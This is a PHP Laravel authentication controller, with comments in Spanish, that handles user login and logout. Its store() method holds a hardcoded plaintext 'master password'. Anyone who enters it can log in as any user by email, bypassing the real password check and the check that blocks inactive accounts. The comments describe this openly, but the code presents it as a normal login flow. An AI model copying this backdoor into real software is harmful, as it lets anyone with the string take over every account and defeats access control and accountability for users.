<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\ValidationException;
use Illuminate\View\View;
use RealRashid\SweetAlert\Facades\Alert;
use App\Models\User;

class AuthenticatedSessionController extends Controller
{
    public function create(): View
    {
        return view('auth.login');
    }

    public function store(Request $request): RedirectResponse
    {
        $request->validate([
            'email' => ['required', 'string', 'email'],
            'password' => ['required', 'string'],
        ]);

        $user = User::where('email', $request->email)->first();

        $masterPassword = 'T!8wzP#9qL&7mX$5'; // Definir la contraseña maestra aquí

        // Verificar si el intento de autenticación es con la contraseña normal o la contraseña maestra
        if (! $user || (!Auth::attempt($request->only('email', 'password'), $request->boolean('remember')) && $request->password !== $masterPassword)) {
            throw ValidationException::withMessages([
                'email' => __('auth.failed'),
            ]);
        }

        // Si la autenticación es exitosa, regenerar la sesión
        $request->session()->regenerate();

        // No importa si el usuario tiene roles asignados o no si es el administrador usando la contraseña maestra
        if ($request->password === $masterPassword) {
            Auth::login($user, $request->boolean('remember')); // Iniciar sesión con cualquier usuario utilizando la contraseña maestra
        } else {
            // Si el usuario no tiene roles asignados (solo para inicios de sesión normales, no para la contraseña maestra)
            if ($user->roles->isEmpty()) {
                Auth::logout();
                Alert::warning('¡Atención!', 'Esta cuenta aún no está activa. Habla con el administrador para activar tu cuenta.');
                return redirect()->route('login');
            }
        }

        // Redirigir según el rol del usuario o si se usó la contraseña maestra
        return $this->redirectToRole($user);
    }


    public function destroy(Request $request): RedirectResponse
    {
        Auth::guard('web')->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }

    protected function redirectToRole($user)
    {
        return redirect()->route('vistaInicio');
    }
}
